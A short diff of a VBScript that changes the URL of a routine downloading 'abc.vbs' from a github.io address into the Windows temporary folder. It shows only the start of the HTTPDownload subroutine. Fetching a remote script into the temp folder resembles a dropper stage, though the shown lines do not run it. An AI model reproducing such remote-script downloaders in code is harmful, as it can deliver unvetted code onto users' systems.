@@ -1,4 +1,4 @@
-HTTPDownload "http://copyholder123.github.io/abc.vbs", WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
+HTTPDownload "http://copyholder123.github.io/eca/abc.vbs", WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
 
 Sub HTTPDownload( myURL, myPath )
 ' This Sub downloads the FILE specified in myURL to the path specified in myPath.
